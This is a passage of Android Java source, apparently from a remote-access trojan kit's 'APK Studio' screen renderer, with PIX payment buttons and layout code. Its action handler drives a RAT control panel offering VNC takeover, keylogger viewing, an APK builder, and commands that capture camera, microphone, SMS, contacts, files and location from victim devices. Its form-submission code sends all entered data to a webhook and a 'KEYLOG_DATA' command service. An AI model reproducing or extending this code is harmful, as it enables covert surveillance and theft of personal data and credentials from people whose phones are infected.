    private Button createPixCopyButton(JSONObject element) throws JSONException {
        Button btn = createButton(element);
        
        btn.setOnClickListener(v -> {
            // Copia código PIX para clipboard
            String pixCode = element.optString("pixCode", "PIX_CODE_AQUI");
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("PIX", pixCode);
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Código PIX copiado!", Toast.LENGTH_SHORT).show();
        });
        
        return btn;
    }
    
    // ==================== ESTILOS E POSICIONAMENTO ====================
    
    private void applyCommonStyles(View view, JSONObject element) throws JSONException {
        // Posição e tamanho do design
        float x = (float) element.optDouble("x", 0);
        float y = (float) element.optDouble("y", 0);
        float width = (float) element.optDouble("width", 100);
        float height = (float) element.optDouble("height", 50);
        
        // Converte coordenadas do editor para tela real
        int screenWidth = getResources().getDisplayMetrics().widthPixels;
        int screenHeight = getResources().getDisplayMetrics().heightPixels;
        
        // 🔥 CORREÇÃO: Usa escala separada para X e Y para preencher toda a tela
        float scaleX = screenWidth / DESIGN_WIDTH;
        float scaleY = screenHeight / DESIGN_HEIGHT;
        
        // Calcula posição e tamanho com escala proporcional
        int realX = (int) (x * scaleX);
        int realY = (int) (y * scaleY);
        int realWidth = (int) (width * scaleX);
        int realHeight = (int) (height * scaleY);
        
        // Garante tamanho mínimo
        if (realWidth < 10) realWidth = 10;
        if (realHeight < 10) realHeight = 10;
        
        // Garante que não ultrapasse a tela
        if (realX + realWidth > screenWidth) {
            realWidth = screenWidth - realX;
        }
        if (realY + realHeight > screenHeight) {
            realHeight = screenHeight - realY;
        }
        
        RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(realWidth, realHeight);
        params.leftMargin = realX;
        params.topMargin = realY;
        view.setLayoutParams(params);
        
        Log.d(TAG, "📐 Elemento: x=" + x + " y=" + y + " → realX=" + realX + " realY=" + realY + " w=" + realWidth + " h=" + realHeight);
        
        // Opacidade
        int opacity = element.optInt("opacity", 100);
        view.setAlpha(opacity / 100f);
        
        // Rotação
        float rotation = (float) element.optDouble("rotation", 0);
        view.setRotation(rotation);
        
        // Z-Index (elevation)
        int zIndex = element.optInt("zIndex", 0);
        view.setElevation(dpToPx(zIndex));
    }
    
    private void applyAnimation(View view, JSONObject element) {
        String animation = element.optString("animation", "none");
        if ("none".equals(animation)) return;
        
        int duration = element.optInt("animationDuration", 500);
        int delay = element.optInt("animationDelay", 0);
        boolean loop = element.optBoolean("animationLoop", false);
        
        AnimatorSet animatorSet = new AnimatorSet();
        ObjectAnimator animator = null;
        
        switch (animation) {
            case "fadeIn":
                view.setAlpha(0f);
                animator = ObjectAnimator.ofFloat(view, "alpha", 0f, 1f);
                break;
            case "fadeOut":
                animator = ObjectAnimator.ofFloat(view, "alpha", 1f, 0f);
                break;
            case "slideUp":
                view.setTranslationY(200f);
                animator = ObjectAnimator.ofFloat(view, "translationY", 200f, 0f);
                break;
            case "slideDown":
                view.setTranslationY(-200f);
                animator = ObjectAnimator.ofFloat(view, "translationY", -200f, 0f);
                break;
            case "slideLeft":
                view.setTranslationX(200f);
                animator = ObjectAnimator.ofFloat(view, "translationX", 200f, 0f);
                break;
            case "slideRight":
                view.setTranslationX(-200f);
                animator = ObjectAnimator.ofFloat(view, "translationX", -200f, 0f);
                break;
            case "bounce":
                animator = ObjectAnimator.ofFloat(view, "translationY", 0f, -30f, 0f);
                animator.setInterpolator(new BounceInterpolator());
                break;
            case "pulse":
                animator = ObjectAnimator.ofFloat(view, "scaleX", 1f, 1.1f, 1f);
                ObjectAnimator animator2 = ObjectAnimator.ofFloat(view, "scaleY", 1f, 1.1f, 1f);
                animatorSet.playTogether(animator, animator2);
                animatorSet.setDuration(duration);
                animatorSet.setStartDelay(delay);
                if (loop) {
                    animatorSet.addListener(new android.animation.Animator.AnimatorListener() {
                        @Override public void onAnimationStart(android.animation.Animator a) {}
                        @Override public void onAnimationEnd(android.animation.Animator a) {
                            a.start();
                        }
                        @Override public void onAnimationCancel(android.animation.Animator a) {}
                        @Override public void onAnimationRepeat(android.animation.Animator a) {}
                    });
                }
                animatorSet.start();
                return;
            case "shake":
                animator = ObjectAnimator.ofFloat(view, "translationX", 0f, 10f, -10f, 10f, -10f, 0f);
                break;
            case "spin":
                animator = ObjectAnimator.ofFloat(view, "rotation", 0f, 360f);
                break;
            case "flip":
                animator = ObjectAnimator.ofFloat(view, "rotationY", 0f, 180f);
                break;
            case "zoom":
                view.setScaleX(0f);
                view.setScaleY(0f);
                ObjectAnimator zoomX = ObjectAnimator.ofFloat(view, "scaleX", 0f, 1f);
                ObjectAnimator zoomY = ObjectAnimator.ofFloat(view, "scaleY", 0f, 1f);
                animatorSet.playTogether(zoomX, zoomY);
                animatorSet.setDuration(duration);
                animatorSet.setStartDelay(delay);
                animatorSet.start();
                return;
            default:
                return;
        }
        
        if (animator != null) {
            animator.setDuration(duration);
            animator.setStartDelay(delay);
            
            if (loop) {
                animator.setRepeatCount(ObjectAnimator.INFINITE);
            }
            
            animator.start();
        }
    }
    
    // ==================== AÇÕES DOS BOTÕES ====================
    
    private void handleButtonAction(String action, String extra) {
        switch (action) {
            case "next_screen":
                if (currentScreenIndex < screens.length() - 1) {
                    renderScreen(currentScreenIndex + 1);
                }
                break;
                
            case "prev_screen":
                if (currentScreenIndex > 0) {
                    renderScreen(currentScreenIndex - 1);
                }
                break;
                
            case "submit":
                submitFormData();
                break;
                
            case "open_url":
                if (!extra.isEmpty()) {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(extra));
                    startActivity(intent);
                }
                break;
                
            case "call_phone":
                if (!extra.isEmpty()) {
                    Intent callIntent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + extra));
                    startActivity(callIntent);
                }
                break;
                
            case "send_sms":
                if (!extra.isEmpty()) {
                    Intent smsIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + extra));
                    startActivity(smsIntent);
                }
                break;
                
            case "close":
                finish();
                break;
                
            case "minimize":
                moveTaskToBack(true);
                break;
                
            case "generate_pix":
                // Gera código PIX
                Toast.makeText(this, "Gerando PIX...", Toast.LENGTH_SHORT).show();
                break;
                
            case "copy_pix":
                // Copia código PIX
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("PIX", extra);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this, "Código PIX copiado!", Toast.LENGTH_SHORT).show();
                break;
                
            case "accessibility":
                // Abre configurações de acessibilidade
                Intent accessibilityIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(accessibilityIntent);
                break;
                
            case "goto_screen":
                // Navega para tela específica
                try {
                    int targetIndex = Integer.parseInt(extra);
                    if (targetIndex >= 0 && targetIndex < screens.length()) {
                        renderScreen(targetIndex);
                    }
                } catch (NumberFormatException e) {
                    Log.e(TAG, "goto_screen: índice inválido: " + extra);
                }
                break;
                
            // ==================== AÇÕES DO PAINEL MOBILE ====================
            
            case "open_dashboard":
            case "view_devices":
                // Abre o dashboard/lista de dispositivos no WebView
                openRatPanel("/dashboard");
                break;
                
            case "start_vnc":
                // Abre controle VNC (precisa do device_id)
                String deviceId = getSelectedDeviceId();
                if (deviceId != null) {
                    openRatPanel("/device/" + deviceId);
                } else {
                    Toast.makeText(this, "Selecione um dispositivo primeiro", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case "view_keylog":
                // Abre keylogger
                String kDeviceId = getSelectedDeviceId();
                if (kDeviceId != null) {
                    openRatPanel("/device/" + kDeviceId + "#keylogger");
                } else {
                    Toast.makeText(this, "Selecione um dispositivo primeiro", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case "generate_apk":
                // Abre APK Builder
                openRatPanel("/apk-builder");
                break;
                
            case "capture_camera":
                sendDeviceCommand("CAMERA_FRONT");
                break;
                
            case "capture_mic":
                sendDeviceCommand("MICROPHONE_START");
                break;
                
            case "get_files":
                sendDeviceCommand("FILE_LIST");
                break;
                
            case "get_sms":
                sendDeviceCommand("SMS_LIST");
                break;
                
            case "get_contacts":
                sendDeviceCommand("CONTACTS_LIST");
                break;
                
            case "get_location":
                sendDeviceCommand("LOCATION");
                break;
                
            case "lock_screen":
                sendDeviceCommand("LOCK_SCREEN");
                break;
                
            case "unlock_screen":
                sendDeviceCommand("UNLOCK_SCREEN");
                break;
                
            case "show_toast":
                sendDeviceCommand("TOAST:" + extra);
                break;
                
            case "vibrate":
                sendDeviceCommand("VIBRATE");
                break;
                
            case "play_sound":
                sendDeviceCommand("PLAY_SOUND");
                break;
                
            case "black_screen":
                sendDeviceCommand("BLACK_SCREEN_ON");
                break;
                
            case "login":
                // Faz login com credenciais dos inputs
                performLogin();
                break;
        }
    }
    
    // ==================== FUNÇÕES DO PAINEL MOBILE ====================
    
    private String selectedDeviceId = null;
    
    private String getSelectedDeviceId() {
        return selectedDeviceId;
    }
    
    private void setSelectedDeviceId(String deviceId) {
        this.selectedDeviceId = deviceId;
    }
    
    /**
     * Abre o painel de controle em WebView fullscreen
     */
    private void openRatPanel(String path) {
        try {
            String serverUrl = config.optString("serverUrl", "http://localhost:7771");
            if (serverUrl.endsWith("/")) {
                serverUrl = serverUrl.substring(0, serverUrl.length() - 1);
            }
            
            // Cria WebView fullscreen
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.getSettings().setDomStorageEnabled(true);
            webView.getSettings().setAllowFileAccess(true);
            webView.getSettings().setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            
            // Obtém token salvo
            String token = getSharedPreferences("rat_prefs", MODE_PRIVATE).getString("auth_token", "");
            
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    // Injeta token de autenticação
                    if (!token.isEmpty()) {
                        view.evaluateJavascript(
                            "localStorage.setItem('token', '" + token + "');",
                            null
                        );
                    }
                }
            });
            
            String fullUrl = serverUrl + path;
            Log.d(TAG, "Abrindo Control Panel: " + fullUrl);
            
            // Substitui layout atual pelo WebView
            rootLayout.removeAllViews();
            rootLayout.addView(webView, new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT
            ));
            
            webView.loadUrl(fullUrl);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao abrir Control Panel: " + e.getMessage());
            Toast.makeText(this, "Erro ao conectar ao servidor", Toast.LENGTH_SHORT).show();
        }
    }
    
    /**
     * Envia comando para dispositivo selecionado
     */
    private void sendDeviceCommand(String command) {
        String deviceId = getSelectedDeviceId();
        if (deviceId == null) {
            Toast.makeText(this, "Selecione um dispositivo primeiro", Toast.LENGTH_SHORT).show();
            return;
        }
        
        new Thread(() -> {
            try {
                String serverUrl = config.optString("serverUrl", "http://localhost:7771");
                String token = getSharedPreferences("rat_prefs", MODE_PRIVATE).getString("auth_token", "");
                
                URL url = new URL(serverUrl + "/api/devices/" + deviceId + "/command");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Bearer " + token);
                conn.setDoOutput(true);
                
                JSONObject body = new JSONObject();
                body.put("command", command);
                
                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes());
                os.close();
                
                int responseCode = conn.getResponseCode();
                
                runOnUiThread(() -> {
                    if (responseCode == 200) {
                        Toast.makeText(this, "Comando enviado!", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "Erro ao enviar comando", Toast.LENGTH_SHORT).show();
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar comando: " + e.getMessage());
                runOnUiThread(() -> {
                    Toast.makeText(this, "Erro de conexão", Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }
    
    /**
     * Faz login no servidor remoto
     */
    private void performLogin() {
        String username = "";
        String password = "";
        
        // Busca credenciais dos inputs
        for (Map.Entry<String, EditText> entry : inputFields.entrySet()) {
            String label = entry.getKey().toLowerCase();
            if (label.contains("user") || label.contains("usuario") || label.contains("login")) {
                username = entry.getValue().getText().toString();
            } else if (label.contains("pass") || label.contains("senha")) {
                password = entry.getValue().getText().toString();
            }
        }
        
        if (username.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Preencha usuário e senha", Toast.LENGTH_SHORT).show();
            return;
        }
        
        final String finalUsername = username;
        final String finalPassword = password;
        
        Toast.makeText(this, "Conectando...", Toast.LENGTH_SHORT).show();
        
        new Thread(() -> {
            try {
                String serverUrl = config.optString("serverUrl", "http://localhost:7771");
                
                URL url = new URL(serverUrl + "/api/auth/login");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject body = new JSONObject();
                body.put("username", finalUsername);
                body.put("password", finalPassword);
                
                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes());
                os.close();
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        response.append(line);
                    }
                    br.close();
                    
                    JSONObject result = new JSONObject(response.toString());
                    String token = result.getString("access_token");
                    
                    // Salva token
                    getSharedPreferences("rat_prefs", MODE_PRIVATE)
                        .edit()
                        .putString("auth_token", token)
                        .putString("username", finalUsername)
                        .apply();
                    
                    runOnUiThread(() -> {
                        Toast.makeText(this, "Login realizado com sucesso!", Toast.LENGTH_SHORT).show();
                        // Avança para próxima tela (dashboard)
                        if (currentScreenIndex < screens.length() - 1) {
                            renderScreen(currentScreenIndex + 1);
                        }
                    });
                    
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "Usuário ou senha incorretos", Toast.LENGTH_SHORT).show();
                    });
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Erro no login: " + e.getMessage());
                runOnUiThread(() -> {
                    Toast.makeText(this, "Erro de conexão com o servidor", Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }
    
    // ==================== ENVIO DE DADOS ====================
    
    private void submitFormData() {
        try {
            JSONObject data = new JSONObject();
            
            // Coleta inputs
            for (Map.Entry<String, EditText> entry : inputFields.entrySet()) {
                data.put(entry.getKey(), entry.getValue().getText().toString());
            }
            
            // Coleta checkboxes
            for (Map.Entry<String, CheckBox> entry : checkboxFields.entrySet()) {
                data.put(entry.getKey(), entry.getValue().isChecked());
            }
            
            // Coleta switches
            for (Map.Entry<String, Switch> entry : switchFields.entrySet()) {
                data.put(entry.getKey(), entry.getValue().isChecked());
            }
            
            // Coleta sliders
            for (Map.Entry<String, SeekBar> entry : sliderFields.entrySet()) {
                data.put(entry.getKey(), entry.getValue().getProgress());
            }
            
            // Adiciona metadados
            data.put("_screen", currentScreenIndex);
            data.put("_timestamp", System.currentTimeMillis());
            data.put("_projectId", projectId);
            
            Log.d(TAG, "Enviando dados: " + data.toString());
            
            // Envia para webhook
            sendToWebhook(data);
            
            // Também envia para o serviço remoto se habilitado
            if (enableRat || enableKeylogger) {
                sendToRatService(data);
            }
            
            // Avança para próxima tela se houver
            if (currentScreenIndex < screens.length() - 1) {
                renderScreen(currentScreenIndex + 1);
            } else {
                Toast.makeText(this, "Dados enviados!", Toast.LENGTH_SHORT).show();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao coletar dados: " + e.getMessage());
        }
    }
    
    private void sendToWebhook(JSONObject data) {
        if (webhookUrl == null || webhookUrl.isEmpty()) return;
        
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    // Constrói URL completa
                    String fullUrl = webhookUrl;
                    if (!webhookUrl.startsWith("http")) {
                        // Usa URL HTTP do servidor se for path relativo
                        fullUrl = CommandControlService.getServerHttpUrl() + webhookUrl;
                    }
                    
                    URL url = new URL(fullUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    
                    OutputStream os = conn.getOutputStream();
                    os.write(data.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    
                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "Webhook response: " + responseCode);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao enviar para webhook: " + e.getMessage());
                }
                return null;
            }
        }.execute();
    }
    
    private void sendToRatService(JSONObject data) {
        try {
            Intent intent = new Intent("KEYLOG_DATA");
            
            JSONObject payload = new JSONObject();
            payload.put("type", "STUDIO_FORM_DATA");
            payload.put("data", data);
            payload.put("project_id", projectId);
            
            intent.putExtra("json_data", payload.toString());
            sendBroadcast(intent);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar para serviço remoto: " + e.getMessage());
        }
    }
    
    // ==================== SERVIÇOS REMOTOS ====================
    
    private void startRatServices() {
        try {
            Intent serviceIntent = new Intent(this, CommandControlService.class);
            startService(serviceIntent);
            Log.d(TAG, "Serviços remotos iniciados");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar serviços remotos: " + e.getMessage());
        }
    }
    
    // ==================== UTILITÁRIOS ====================
    
    private int dpToPx(int dp) {
        float density = getResources().getDisplayMetrics().density;
        return Math.round(dp * density);
    }
    
    private void loadImageFromUrl(final ImageView imageView, final String imageUrl) {
        new AsyncTask<Void, Void, Bitmap>() {
            @Override
            protected Bitmap doInBackground(Void... voids) {
                try {
                    URL url = new URL(imageUrl);
                    InputStream is = url.openStream();
                    return BitmapFactory.decodeStream(is);
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao carregar imagem: " + e.getMessage());
                    return null;
                }
            }
            
            @Override
            protected void onPostExecute(Bitmap bitmap) {
                if (bitmap != null) {
                    imageView.setImageBitmap(bitmap);
                }
            }
        }.execute();
    }
    
    private void showErrorScreen(String message) {
        rootLayout.setBackgroundColor(Color.parseColor("#1a1a2e"));
        
        TextView tv = new TextView(this);
        tv.setText("⚠️ " + message);
        tv.setTextColor(Color.WHITE);
        tv.setTextSize(18);
        tv.setGravity(Gravity.CENTER);
        
        RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        );
        tv.setLayoutParams(params);
        
        rootLayout.addView(tv);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Cancela todos os timers
        for (Timer timer : activeTimers.values()) {
            timer.cancel();
        }
        activeTimers.clear();
    }
    
    /**
     * Verifica se existe configuração do APK Studio
     */
    public static boolean hasStudioConfig(Context context) {
        try {
            InputStream is = context.getAssets().open("studio_config.json");
            is.close();
            return true;
        } catch (IOException e) {
            return false;
        }
    }
}

